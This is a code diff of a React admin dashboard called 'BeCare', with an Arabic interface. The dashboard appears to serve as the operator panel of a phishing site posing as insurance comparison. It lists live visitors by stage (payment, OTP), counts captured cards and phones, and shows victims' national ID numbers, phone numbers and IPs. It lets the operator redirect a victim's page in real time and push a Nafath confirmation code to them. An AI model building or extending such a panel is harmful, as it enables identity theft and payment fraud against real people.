+        <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
+          <div style={{ display: "flex", gap: 8 }}>
+            <input
+              type="text"
+              placeholder="أدخل رقم التأكيد"
+              value={nafadInput}
+              onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+              style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
+            />
+            <button
+              onClick={() => {
+                handleSendNafadCode();
+                setNafadInput("");
+              }}
+              disabled={actionLoading === "nafad" || !nafadInput}
+              style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
+            >
+              إرسال
+            </button>
           </div>
-        )}
-        
-        {/* Waiting message */}
-        {!adminNafadCode && hasNafadData && (
-          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إرسال رمز النفاذ</p>
-          </div>
-        )}
+        </div>
+      </div>
+    );
+  };
+
+  const renderCustomerEntrySummary = () => {
+    if (!selectedRequest) return null;
+    const previousEntries = customerEntryGroup.filter((entry) => entry.id !== selectedRequest.id);
+    if (!previousEntries.length) return null;
+
+    return (
+      <div style={{ background: "#ffffff", border: "1px solid #e5e7eb", borderRadius: 12, padding: 12, marginBottom: 12, boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)" }}>
+        <div style={{ fontSize: "0.8rem", fontWeight: 700, color: "#111827", marginBottom: 8 }}>إدخالات العميل داخل هذا الصندوق</div>
+        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+          {previousEntries.map((entry, index) => (
+            <div key={entry.id} style={{ border: "1px solid #e5e7eb", borderRadius: 10, padding: 10, background: "#f8fafc" }}>
+              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", gap: 8, marginBottom: 6 }}>
+                <span style={{ fontWeight: 700, color: "#111827" }}>إدخال جديد {index + 1}</span>
+                <span style={{ fontSize: "0.75rem", color: "#64748b", background: "#f3f4f6", padding: "2px 8px", borderRadius: 6 }}>
+                  {entry.stage || "مفتوح"}
+                </span>
+              </div>
+              <div style={{ display: "flex", flexWrap: "wrap", gap: 8, fontSize: "0.8rem", color: "#374151" }}>
+                <span>الهوية: {entry.raw?.identityNumber || entry.raw?.phoneIdNumber || entry.raw?.nafadIdNumber || "—"}</span>
+                <span>الجوال: {entry.raw?.phoneNumber || entry.raw?.mobileNumber || "—"}</span>
+                <span>الوقت: {new Date(entry.submittedAt || entry.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}</span>
+              </div>
+            </div>
+          ))}
+        </div>
       </div>
     );
   };
@@ -819,7 +1023,7 @@ export default function DashboardPage() {
   };
 
   return (
-    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif" }} dir="rtl">
+    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif", margin: 0, padding: 0 }} dir="rtl">
       {/* Notification */}
       {notification && (
         <div
@@ -847,6 +1051,7 @@ export default function DashboardPage() {
         style={{
           display: "flex",
           alignItems: "center",
+          gap: 0,
           height: 54,
           padding: "0 12px",
           background: "#ffffff",
@@ -854,21 +1059,23 @@ export default function DashboardPage() {
           position: "sticky",
           top: 0,
           zIndex: 100,
+          boxShadow: "0 1px 0 rgba(15, 23, 42, 0.04)",
         }}
+        dir="rtl"
       >
-        {/* Logo */}
-        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, paddingLeft: 12, borderLeft: "1px solid #e5e7eb" }}>
           <div
             style={{
               width: 28,
               height: 28,
-              borderRadius: 6,
+              borderRadius: 8,
               background: "linear-gradient(135deg, #22c55e, #15803d)",
               display: "grid",
               placeItems: "center",
               fontWeight: 900,
               fontSize: "0.8rem",
               color: "#fff",
+              boxShadow: "0 8px 20px rgba(34, 197, 94, 0.22)",
             }}
           >
             B
@@ -876,78 +1083,120 @@ export default function DashboardPage() {
           <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
         </div>
 
-        {/* Stats */}
-        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto" }}>
-          {/* Live indicator */}
-          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
-            <span
-              style={{
-                width: 8,
-                height: 8,
-                borderRadius: "50%",
-                background: "#4ade80",
-                boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)",
-              }}
-            />
-            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
+        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
+            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)" }} />
+            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.activeCount}</span>
+            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>الزوار الحاليون</span>
           </div>
 
-          {/* Today */}
-          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
-              <path d="M16 7h6v6M22 7L12 17l-5-5L2 17" />
+              <path d="M16 7h6v6" />
+              <path d="m22 7-8.5 8.5-5-5L2 17" />
             </svg>
             <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
-            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
+            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.todayCount}</span>
           </div>
 
-          {/* Total */}
-          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
               <circle cx="12" cy="12" r="10" />
-              <path d="M2 12h20M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
+              <path d="M2 12h20" />
+              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
             </svg>
             <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
             <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
           </div>
 
-          {/* Cards */}
-          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb", color: "#2563eb" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#2563eb" }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
               <rect width="20" height="14" x="2" y="5" rx="2" />
               <line x1="2" x2="22" y1="10" y2="10" />
             </svg>
-            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
+            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.cardCount}</span>
           </div>
 
-          {/* Visitors */}
-          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", color: "#16a34a" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#16a34a" }}>
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
-              <circle cx="9" cy="7" r="4" />
-              <path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75" />
+              <path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" />
             </svg>
-            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
+            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.phoneCount}</span>
+          </div>
+
+          <div style={{ width: 1, height: 20, background: "#e5e7eb", margin: "0 4px" }} />
+
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
+            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>زوار</span>
+            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
+            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
+            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
+            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
+            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
+          </div>
+
+          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px" }}>
+            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>عملاء</span>
+            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
+            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
+            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
+            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
+            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
           </div>
         </div>
 
-        {/* User */}
-        <div style={{ display: "flex", alignItems: "center", gap: 6, marginRight: 8, paddingRight: 8, borderRight: "1px solid #e5e7eb" }}>
-          <div
-            style={{
-              width: 28,
-              height: 28,
-              borderRadius: "50%",
-              background: "linear-gradient(135deg, #3b82f6, #7c3aed)",
-              display: "grid",
-              placeItems: "center",
-              color: "#fff",
-              fontWeight: 700,
-              fontSize: "0.8rem",
-            }}
-          >
-            A
+        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: 8, borderRight: "1px solid #e5e7eb", paddingRight: 8 }}>
+          <div ref={headerMenuRef} style={{ position: "relative" }}>
+            <button
+              onClick={() => setHeaderMenuOpen((value) => !value)}
+              title="إعدادات"
+              style={{
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                width: 40,
+                height: 40,
+                border: "none",
+                borderRadius: 8,
+                background: headerMenuOpen ? "#f3f4f6" : "transparent",
+                cursor: "pointer",
+              }}
+            >
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915" />
+                <circle cx="12" cy="12" r="3" />
+              </svg>
+            </button>
+            {headerMenuOpen && (
+              <div style={{ position: "absolute", top: 44, left: 0, minWidth: 180, background: "#fff", border: "1px solid #e5e7eb", borderRadius: 10, boxShadow: "0 12px 30px rgba(15, 23, 42, 0.12)", overflow: "hidden", zIndex: 120 }}>
+                <button style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#0f172a", fontWeight: 600 }}>
+                  لوحة التحكم
+                </button>
+                <button style={{ width: "100%", border: "none", background: "#f8fafc", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#334155", fontWeight: 600 }}>
+                  التقارير
+                </button>
+                <button style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#334155", fontWeight: 600 }}>
+                  المستخدمون
+                </button>
+              </div>
+            )}
           </div>
+
+          <button title="تنبيهات" style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 40, border: "none", borderRadius: 8, background: "transparent", cursor: "pointer" }}>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M10.268 21a2 2 0 0 0 3.464 0" />
+              <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326" />
+            </svg>
+          </button>
+
+          <button title="تسجيل الخروج" style={{ display: "flex", alignItems: "center", gap: 8, padding: "0 10px", height: 40, border: "none", borderRadius: 999, background: "#f8fafc", cursor: "pointer" }}>
+            <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #3b82f6, #7c3aed)", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "0.8rem" }}>
+              A
+            </div>
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <path d="M19 9l-7 7-7-7" />
+            </svg>
+          </button>
         </div>
       </header>
 
@@ -1032,75 +1281,111 @@ export default function DashboardPage() {
                 }}
               />
             </div>
+
+            {selectedRequestIds.length > 0 && (
+              <div style={{ display: "flex", gap: 8, marginTop: 12, flexWrap: "wrap" }}>
+                <button
+                  onClick={handleSelectAll}
+                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #e5e7eb", background: "#f8fafc", color: "#0f172a", fontWeight: 700, cursor: "pointer" }}
+                >
+                  تحديد الكل
+                </button>
+                <button
+                  onClick={handleDeleteSelected}
+                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #fecaca", background: "#fef2f2", color: "#b91c1c", fontWeight: 700, cursor: "pointer" }}
+                >
+                  حذف
+                </button>
+                <button
+                  onClick={handleArchiveSelected}
+                  style={{ flex: 1, minWidth: 84, padding: "8px 10px", borderRadius: 8, border: "1px solid #bfdbfe", background: "#eff6ff", color: "#1d4ed8", fontWeight: 700, cursor: "pointer" }}
+                >
+                  أرشفة
+                </button>
+              </div>
+            )}
           </div>
 
           {/* Visitor List - Sorted by newest first */}
           <div style={{ flex: 1, overflowY: "auto" }}>
-            {filteredRequests.map((item) => (
-              <div
-                key={item.id}
-                onClick={() => setSelectedRequestId(item.id)}
-                style={{
-                  padding: "16px",
-                  borderBottom: "1px solid #f3f4f6",
-                  background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
-                  cursor: "pointer",
-                  transition: "background 0.2s",
-                }}
-              >
-                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
-                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                    <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
-                    <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
+            {filteredRequests.map((item) => {
+              const isSelected = selectedRequestIds.includes(item.id);
+              return (
+                <div
+                  key={item.id}
+                  onClick={() => setSelectedRequestId(item.id)}
+                  style={{
+                    padding: "16px",
+                    borderBottom: "1px solid #f3f4f6",
+                    background: selectedRequestId === item.id ? "#e0f2fe" : "#fff",
+                    cursor: "pointer",
+                    transition: "background 0.2s",
+                  }}
+                >
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 8 }}>
+                    <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
+                      <input
+                        type="checkbox"
+                        checked={isSelected}
+                        onChange={(event) => {
+                          event.stopPropagation();
+                          toggleRequestSelection(item.id);
+                        }}
+                        onClick={(event) => event.stopPropagation()}
+                        style={{ accentColor: "#22c55e", cursor: "pointer" }}
+                      />
+                      <span style={{ fontSize: "1.3rem" }}>{getCountryFlag(item.raw)}</span>
+                      <span style={{ fontWeight: 700, fontSize: "1rem", color: "#111827" }}>{item.customer}</span>
+                    </div>
+                    <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                      <span style={{ 
+                        background: "#f3f4f6", 
+                        padding: "4px 8px", 
+                        borderRadius: 6,
+                        fontSize: "0.8rem",
+                        fontWeight: 600
+                      }}>
+                        ⏱️ <LiveTimer startTime={item.submittedAt || item.updatedAt || ""} />
+                      </span>
+                    </div>
                   </div>
-                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                    <span style={{ 
-                      background: "#f3f4f6", 
-                      padding: "4px 8px", 
-                      borderRadius: 6,
-                      fontSize: "0.8rem",
-                      fontWeight: 600
-                    }}>
-                      ⏱️ <LiveTimer startTime={item.updatedAt || item.submittedAt || ""} />
-                    </span>
+                  <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+                    <div
+                      style={{
+                        display: "inline-block",
+                        padding: "4px 12px",
+                        borderRadius: 6,
+                        fontSize: "0.8rem",
+                        fontWeight: 600,
+                        background:
+                          item.stage === "الدفع"
+                            ? "#dbeafe"
+                            : item.stage === "التأمين"
+                              ? "#fef3c7"
+                              : item.stage === "مقارنة"
+                                ? "#f3e8ff"
+                                : item.stage === "OTP"
+                                  ? "#fee2e2"
+                                  : "#e0f2fe",
+                        color:
+                          item.stage === "الدفع"
+                            ? "#2563eb"
+                            : item.stage === "التأمين"
+                              ? "#d97706"
+                              : item.stage === "مقارنة"
+                                ? "#9333ea"
+                                : item.stage === "OTP"
+                                  ? "#dc2626"
+                                  : "#0284c7",
+                      }}
+                    >
+                      {item.stage}
+                    </div>
+                    <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
                   </div>
                 </div>
-                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                  <div
-                    style={{
-                      display: "inline-block",
-                      padding: "4px 12px",
-                      borderRadius: 6,
-                      fontSize: "0.8rem",
-                      fontWeight: 600,
-                      background:
-                        item.stage === "الدفع"
-                          ? "#dbeafe"
-                          : item.stage === "التأمين"
-                            ? "#fef3c7"
-                            : item.stage === "مقارنة"
-                              ? "#f3e8ff"
-                              : item.stage === "OTP"
-                                ? "#fee2e2"
-                                : "#e0f2fe",
-                      color:
-                        item.stage === "الدفع"
-                          ? "#2563eb"
-                          : item.stage === "التأمين"
-                            ? "#d97706"
-                            : item.stage === "مقارنة"
-                              ? "#9333ea"
-                              : item.stage === "OTP"
-                                ? "#dc2626"
-                                : "#0284c7",
-                    }}
-                  >
-                    {item.stage}
-                  </div>
-                  <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
-                </div>
-              </div>
-            ))}
+              );
+            })}
             {filteredRequests.length === 0 && (
               <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
             )}
@@ -1108,66 +1393,43 @@ export default function DashboardPage() {
         </aside>
 
         {/* Main Panel - Client Details */}
-        <main style={{ flex: 1, padding: 20, overflowY: "auto" }}>
+        <main style={{ flex: 1, padding: 0, overflowY: "auto", margin: 0 }}>
           {selectedRequest && (
-            <div style={{ maxWidth: 800 }}>
+            <div style={{ maxWidth: "100%", width: "100%", margin: 0 }}>
               {/* Client Header */}
               <div
                 style={{
                   background: "#ffffff",
-                  borderRadius: 12,
-                  padding: 16,
-                  marginBottom: 16,
                   border: "1px solid #e5e7eb",
+                  boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)",
                 }}
               >
-                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
-                  {/* Client Info */}
-                  <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
-                    <div
-                      style={{
-                        width: 48,
-                        height: 48,
-                        borderRadius: "50%",
-                        background: "#f0f9ff",
-                        display: "grid",
-                        placeItems: "center",
-                        fontSize: "1.5rem",
-                      }}
-                    >
-                      {getCountryFlag(selectedRequest.raw)}
-                    </div>
-                    <div>
-                      <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 700, color: "#111827" }}>{selectedRequest.customer}</h2>
-                      <p style={{ margin: "4px 0 0", fontSize: "0.8rem", color: "#6b7280" }}>{selectedRequest.id}</p>
-                    </div>
-                  </div>
-                </div>
-
-                {/* Current Page Indicator */}
-                <div style={{ marginTop: 8, padding: "6px 12px", background: "#f0f9ff", borderRadius: 6, display: "inline-block" }}>
-                  <span style={{ fontSize: "0.8rem", color: "#2563eb", fontWeight: 600 }}>
-                    الصفحة الحالية: {getCurrentPage() || "غير معروف"}
+                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "10px 12px", borderBottom: "1px solid #e5e7eb" }}>
+                  <span style={{ fontSize: "11px", fontFamily: "ui-monospace, SFMono-Regular, monospace", color: "#6b7280", background: "#f3f4f6", border: "1px solid #e5e7eb", padding: "2px 8px", borderRadius: 4, flexShrink: 0 }}>
+                    {selectedRequest.id.slice(0, 10).toUpperCase()}
                   </span>
-                </div>
-
-                {/* Manual Redirect Control */}
-                <div style={{ marginTop: 16, padding: "12px", background: "#fef3c7", borderRadius: 8, border: "1px solid #fcd34d" }}>
-                  <p style={{ margin: "0 0 8px", fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>
-                    🔄 توجيه العميل يدوياً
-                  </p>
+                  <button
+                    title="تحديث"
+                    style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0, border: "none", background: "transparent", padding: 0, cursor: "pointer" }}
+                  >
+                    <span style={{ fontWeight: 700, color: "#111827", fontSize: "0.9rem", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
+                      {liveSummary.ownerName || selectedRequest.customer}
+                    </span>
+                    <span style={{ color: "#9ca3af", fontSize: "0.85rem" }}>↻</span>
+                  </button>
+                  <div style={{ flex: 1 }} />
                   <select
                     value={redirectPage}
                     onChange={async (e) => {
                       const selectedPage = e.target.value;
                       if (!selectedPage) return;
-                      
+
                       const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                       if (!visitorId) return;
-                      
+
                       setActionLoading("redirect");
                       setRedirectPage(selectedPage);
-                      
+
                       try {
                         const res = await fetch("/api/dashboard/redirect", {
                           method: "POST",
@@ -1175,7 +1437,7 @@ export default function DashboardPage() {
                           body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                         });
                         if (res.ok) {
-                          const pageLabel = pageOptions.find(p => p.value === selectedPage)?.label || selectedPage;
+                          const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
                           showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
                         } else {
                           showNotification("error", "حدث خطأ");
@@ -1184,145 +1446,229 @@ export default function DashboardPage() {
                         showNotification("error", "فشل الاتصال");
                       }
                       setActionLoading(null);
-                      setRedirectPage(""); // Reset after sending
+                      setRedirectPage("");
                     }}
                     style={{
-                      width: "100%",
+                      fontSize: "11px",
                       padding: "4px 8px",
-                      borderRadius: "0.25rem",
-                      border: "1px solid lab(85.1236% -.612259 -3.7138)",
-                      fontSize: "0.875rem",
-                      fontFamily: "inherit",
-                      background: "lab(100% 0 0)",
-                      color: "lab(35.6337% -1.58697 -10.8425)",
+                      background: "#ffffff",
+                      border: "1px solid #d1d5db",
+                      borderRadius: 6,
+                      color: "#374151",
                       cursor: "pointer",
-                      boxSizing: "border-box",
-                      boxShadow: "0 1px 3px 0 rgba(0,0,0,0.1), 0 1px 2px -1px rgba(0,0,0,0.1)",
-                      fontWeight: 500,
-                      letterSpacing: "0.025em",
+                      boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
                     }}
                   >
                     {pageOptions.map((opt) => (
                       <option key={opt.value} value={opt.value}>{opt.label}</option>
                     ))}
                   </select>
-                  <p style={{ margin: "8px 0 0", fontSize: "0.75rem", color: "#92400e" }}>
-                    سيتم توجيه العميل للصفحة المختارة فوراً
-                  </p>
                 </div>
-
-                {/* Device Info */}
-                <div style={{ display: "flex", alignItems: "center", gap: 16, marginTop: 16, paddingTop: 16, borderTop: "1px solid #f3f4f6" }}>
-                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
-                    <span>{getDeviceIcon(selectedRequest.raw)}</span>
-                    <span>{selectedRequest.raw?.deviceType || selectedRequest.raw?.platform || "غير معروف"}</span>
+                <div style={{ display: "flex", alignItems: "center", gap: 0, overflowX: "auto", fontSize: "11px" }}>
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
+                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.phoneNumber}</span>
                   </div>
-                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
-                    <span>{getCountryFlag(selectedRequest.raw)}</span>
-                    <span>{getCountryCode(selectedRequest.raw)}</span>
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" /></svg>
+                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.identityNumber}</span>
                   </div>
-                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
-                    <span>🌐</span>
-                    <span>{selectedRequest.raw?.ip || "—"}</span>
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
+                    <span style={{ color: "#9ca3af" }}>{liveSummary.deviceType}</span>
                   </div>
-                </div>
-              </div>
-
-              {/* Action Buttons */}
-              {renderActionButtons()}
-
-              {/* Client Details Grid */}
-              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: 16 }}>
-                {/* Basic Info */}
-                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
-                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات أساسية</h3>
-                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                    {[
-                      { label: "الاسم", value: selectedRequest.customer },
-                      { label: "رقم الهوية", value: selectedRequest.raw?.identityNumber || selectedRequest.raw?.buyerIdNumber },
-                      { label: "رقم الهاتف", value: selectedRequest.raw?.phoneNumber },
-                      { label: "نوع الوثيقة", value: selectedRequest.raw?.documentType },
-                      { label: "الرقم التسلسلي", value: selectedRequest.raw?.serialNumber },
-                    ].map(
-                      (item) =>
-                        item.value && (
-                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
-                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
-                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
-                          </div>
-                        )
-                    )}
+                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18" /></svg>
+                    <span style={{ color: "#9ca3af" }}>{liveSummary.os}</span>
                   </div>
-                </div>
-
-                {/* Insurance Info */}
